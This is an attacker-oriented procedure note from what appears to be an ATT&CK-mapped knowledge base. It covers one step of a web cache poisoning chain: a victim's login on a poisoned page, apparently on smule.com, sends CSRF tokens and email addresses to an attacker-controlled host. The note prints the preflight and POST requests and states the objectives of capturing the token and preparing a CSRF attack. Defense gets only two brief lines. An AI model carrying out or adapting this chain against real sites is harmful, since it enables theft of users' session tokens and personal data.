---
tags:
  - data-disclosure
  - csrf-token
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/options-check-email]]'
  - '[[commands/post-check-email]]'
platforms:
  - Web
techniques:
  - '[[Adversary-in-the-Middle]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 08269904-3847-45a2-9200-543d8bdd8997
created_at: '2025-12-13T09:00:34.298Z'
updated_at: '2025-12-13T09:00:34.298Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Adversary-in-the-Middle]]'
---
# Trigger Login on Poisoned Page to Disclose CSRF Token

## Summary

This procedure loads a poisoned cache response in a browser and attempts a login, triggering requests to the attacker host that disclose CSRF tokens and user emails.

## Description

After cache poisoning, interacting with the login form on the modified page sends OPTIONS and POST requests to /user/check_email on the poisoned host, leaking sensitive data. This is part of a chain leading to CSRF attacks. Requires a browser and prior cache poisoning. Expected outcome is capture of CSRF token and email for further exploitation.

## Requirements

1. Poisoned cache from previous step
2. Browser to load the response
3. Attacker-controlled host to receive requests

## Defense

Defensive measures and detection strategies:

- Implement strict CORS policies
- Monitor for cross-origin requests to unexpected hosts

## Objectives

1. Disclose CSRF token via redirected request
2. Capture user email
3. Prepare for CSRF attack

## Instructions

### Step 1: Load Poisoned Response and Attempt Login

**Context**: Open the modified page and enter an email to trigger the requests.

**Command** ([[commands/options-check-email]]):
```bash
OPTIONS /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-csrf-token,x-smulen
Origin: https://www.smule.com
Connection: close
```

> This preflight request checks CORS permissions.

**Command** ([[commands/post-check-email]]):
```bash
POST /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27
X-CSRF-Token: [redacted]
Content-Type: application/x-www-form-urlencoded
X-Smulen: daf446d26def7faeef4f6527d7f20fae
Content-Length: 31
Origin: https://www.smule.com
Connection: close

email=foo%40bar.com
```

> This POST discloses the CSRF token and email.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Adversary-in-the-Middle]]

### Sub-Techniques



## Commands Used

- [[commands/options-check-email]]
- [[commands/post-check-email]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- data-disclosure
- csrf-token
